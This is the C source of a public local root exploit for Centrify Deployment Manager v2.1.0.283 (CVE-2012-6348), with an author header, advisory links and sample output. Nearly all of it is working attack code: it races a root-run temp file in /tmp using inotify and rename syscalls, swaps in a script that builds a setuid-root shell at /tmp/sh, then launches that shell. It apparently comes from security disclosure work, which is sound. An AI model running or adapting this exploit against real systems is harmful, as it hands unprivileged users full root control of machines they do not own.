/*Local root exploit for Centrify Deployment Manager v2.1.0.283 local root,
Centrify released a fix very quickly  - nice vendor response.

http://vapid.dhs.org/exploits/centrify_local_r00t.c?

CVE-2012-6348  12/17/2012
http://vapid.dhs.org/advisories/centrify_deployment_manager_insecure_tmp2.html
Greetings vladz,  Thanks for the inotify & syscall technique.

This exploit based on http://vladz.devzero.fr/010_bzexe-vuln.php

Run the exploit and wait for administrator to analyse or deploysoftware
to the system.

larry () h0g:~/code/exploit$ ./cent_root centrify.cmd.0
[*] Launching attack against "centrify.cmd.0"
[+] Creating evil script (/tmp/evil)
[+] Creating target file (/bin/touch /tmp/centrify.cmd.0)
[+] Initialize inotify
[+] Waiting for root to launch "centrify.cmd.0"
[+] Opening root shell (/tmp/sh)

#

Larry W. Cashdollar
@_larry0
*/


#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <string.h>
#include <sys/inotify.h>
#include <fcntl.h>
#include <sys/syscall.h>

/*Create a small c program to pop us a root shell*/
int create_nasty_shell(char *file) {
 char *s = "#!/bin/bash\n"
           "echo 'main(){setuid(0);execve(\"/bin/sh\",0,0);}'>/tmp/sh.c\n"
           "cc /tmp/sh.c -o /tmp/sh; chown root:root /tmp/sh\n"
           "chmod 4755 /tmp/sh;\n";

 int fd = open(file, O_CREAT|O_RDWR, S_IRWXU|S_IRWXG|S_IRWXO);
 write(fd, s, strlen(s));
 close(fd);

 return 0;
}


int main(int argc, char **argv) {
 int fd, wd;
 char buf[1], *targetpath, *cmd,
      *evilsh = "/tmp/evil", *trash = "/tmp/trash";

 if (argc < 2) {
   printf("Usage: %s <target file> \n", argv[0]);
   return 1;
 }

 printf("[*] Launching attack against \"%s\"\n", argv[1]);

 printf("[+] Creating evil script (/tmp/evil)\n");
 create_nasty_shell(evilsh);

 targetpath = malloc(sizeof(argv[1]) + 6);
 cmd = malloc(sizeof(char) * 32);
 sprintf(targetpath, "/tmp/%s", argv[1]);
 sprintf(cmd,"/bin/touch %s",targetpath);
 printf("[+] Creating target file (%s)\n",cmd);
 system(cmd);

 printf("[+] Initialize inotify\n");
 fd = inotify_init();
 wd = inotify_add_watch(fd, targetpath, IN_ATTRIB);

 printf("[+] Waiting for root to change perms on \"%s\"\n", argv[1]);
 syscall(SYS_read, fd, buf, 1);
 syscall(SYS_rename, targetpath,  trash);
 syscall(SYS_rename, evilsh, targetpath);

 inotify_rm_watch(fd, wd);

 printf("[+] Opening root shell (/tmp/sh)\n");
 sleep(2);
 system("rm -fr /tmp/trash;/tmp/sh || echo \"[-] Failed.\"");

 return 0;
}